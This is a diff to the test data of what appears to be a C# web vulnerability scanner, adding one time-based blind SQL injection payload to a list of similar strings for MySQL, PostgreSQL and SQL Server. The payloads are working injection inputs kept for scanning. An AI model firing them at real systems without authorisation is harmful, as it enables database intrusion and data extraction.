@@ -49,6 +49,7 @@ namespace WebVulnerabilitiesScanner.TestData
             new RequestSqlInjectionPayloadEntity($"' AND IF(ASCII(SUBSTRING(database(),1,1))=97, SLEEP({TimeValueForTimeBasedBlind_s}), 0)--", SqlInjectionType.TimeBasedBlind),
             new RequestSqlInjectionPayloadEntity($"' OR CASE WHEN (SELECT 1)=1 THEN pg_sleep({TimeValueForTimeBasedBlind_s}) END--", SqlInjectionType.TimeBasedBlind),
             new RequestSqlInjectionPayloadEntity($"' IF (SELECT DB_NAME())='master' WAITFOR DELAY '0:0:{TimeValueForTimeBasedBlind_s}'--", SqlInjectionType.TimeBasedBlind),
+            new RequestSqlInjectionPayloadEntity($"1 AND (SELECT 1234 FROM (SELECT(SLEEP({TimeValueForTimeBasedBlind_s})))testTable123)", SqlInjectionType.TimeBasedBlind),
         };
 
         /// <summary>
